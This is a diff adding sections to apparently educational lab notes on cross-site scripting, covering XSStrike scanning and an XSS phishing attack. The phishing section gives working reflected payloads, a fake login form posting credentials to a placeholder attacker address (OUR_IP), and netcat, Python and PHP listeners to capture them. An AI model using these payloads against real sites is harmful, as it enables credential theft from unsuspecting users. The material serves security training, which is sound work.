@@ -222,6 +222,8 @@ http://94.237.57.115:55333/#task=<img src="" onerror=alert(window.origin)>
 
 When the victim opens the link, the browser processes the fragment identifier, the vulnerable JavaScript executes, and the payload runs in the victim’s browser.
 
+---
+
 ## Automated XSS Discovery
 
 Manual testing is essential for understanding XSS vulnerabilities, but it can be time-consuming when assessing large applications with many parameters. Automated tools help speed up the discovery process and identify potential injection points that warrant further manual verification.
@@ -258,3 +260,102 @@ In this case, XSStrike identified a reflected XSS vulnerability in the email par
 
 ---
 
+## XSS Phishing Attacks
+
+Phishing attacks rely on presenting **deceptive but legitimate-looking content** to trick victims into disclosing sensitive information, such as usernames and passwords. When combined with XSS vulnerabilities, phishing becomes particularly effective, as the malicious content is executed within the trusted context of the vulnerable application.
+
+A common XSS-based phishing technique involves injecting a **fake login form** into a vulnerable page and exfiltrating submitted credentials to an attacker-controlled server.
+
+Assume we are assessing a web application that functions as a simple image viewer—functionality commonly found in online forums and content platforms:
+
+```
+http://10.129.133.125/phishing/
+```
+
+![Filtered output](images/phishing.png)
+
+As a first step, we test the application for XSS vulnerabilities using `XSStrike`:
+
+```
+python xsstrike.py -u "http://10.129.133.125/phishing/index.php?url=test"
+```
+
+![Filtered output](images/phishing2.png)
+
+`XSStrike` dentifies several working payloads. We begin by testing the following reflected payload:
+
+```bash
+# Payload
+'><D3V%0doNpoINtEreNTEr%0d=%0dconfirm()>v3dm0s
+
+# Example
+http://10.129.133.125/phishing/index.php?url='><D3V%0doNpoINtEreNTEr%0d=%0dconfirm()>v3dm0s
+```
+
+![Filtered output](images/phishing3.png)
+
+The payload is reflected and executed, confirming the presence of a **reflected XSS vulnerability**.
+
+Next, we modify the payload to execute arbitrary JavaScript. As a proof of execution, we trigger a simple alert using an `onerror` handler:
+
+```bash
+http://10.129.133.125/phishing/index.php?url='><D3V%0doNpoINtEreNTEr%0d=%0dconfirm()><img src="" onerror=alert(window.origin)>
+```
+
+![Filtered output](images/phishing4.png)
+
+Successful execution confirms that we can inject and run JavaScript in the victim’s browser.
+
+With code execution established, the next step is to inject a **fake login form** designed to collect credentials and send them to an attacker-controlled server.
+
+A basic HTML login form might look like this:
+
+```html
+<h3>Please login to continue</h3>
+<form action=http://OUR_IP>
+    <input type="username" name="username" placeholder="Username">
+    <input type="password" name="password" placeholder="Password">
+    <input type="submit" name="submit" value="Login">
+</form>
+```
+
+To ensure the payload fits within a single URL parameter, the HTML is **minimized** and written dynamically using `document.write()` in combination with the previously validated injection point.
+
+Conceptually, the payload becomes:
+
+```javascript
+document.write('<minimized login form HTML>')
+```
+
+Injected via the confirmed vector:
+
+```javascript
+// Payload
+0doNpoINtEreNTEr%0d=%0dconfirm()>document.write('minimized code goes here')
+```
+
+![Filtered output](images/phishing5.png)
+
+Before sending the crafted URL to the victim, we start a listener to receive the submitted credentials. This can be done using several common tools:
+
+```bash
+sudo nc -lvnp 8001
+```
+
+or:
+
+```bash
+sudo python -m http.server 8001
+```
+
+or:
+
+```bash
+sudo php -S 0.0.0.0:8001
+```
+
+![Filtered output](images/phishing6.png)
+
+When the victim submits the fake login form, their credentials are sent directly to the attacker-controlled server, completing the phishing attack.
+
+---
